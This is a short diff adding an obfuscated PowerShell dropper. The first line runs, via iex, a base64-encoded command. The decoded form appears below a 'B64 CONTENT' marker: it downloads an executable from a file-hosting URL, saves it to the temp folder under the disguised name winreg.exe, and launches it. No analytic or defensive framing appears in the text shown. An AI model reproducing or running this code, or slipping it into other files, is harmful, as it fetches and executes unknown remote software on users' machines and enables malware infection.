@@ -1,0 +1,7 @@
+iex([sysTEm.TEXT.ENCODING]::utf8.GEtsTRIng([SysTEm.CoNvERT]::fRoMBase64StrING('CihOZXctT2JqZWN0IHNZU3RFbS5uRXQud2VCQ2xpZW5UKS5kT3duTE9BZGZJTGUoJ2h0dHBzOi8vYS5wb21mLmNhdC9oc21xcmguZXhlJywiJGVOdjpURU1QXHdpbnJlZy5leGUiKTtTdGFydC1Qcm9jZXNzICgiJGVOdjpURU1QXHdpbnJlZy5leGUiKQoK')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object sYStEm.nEt.weBClienT).dOwnLOAdfILe('https://a.pomf.cat/hsmqrh.exe',"$eNv:TEMP\winreg.exe");Start-Process ("$eNv:TEMP\winreg.exe")
+
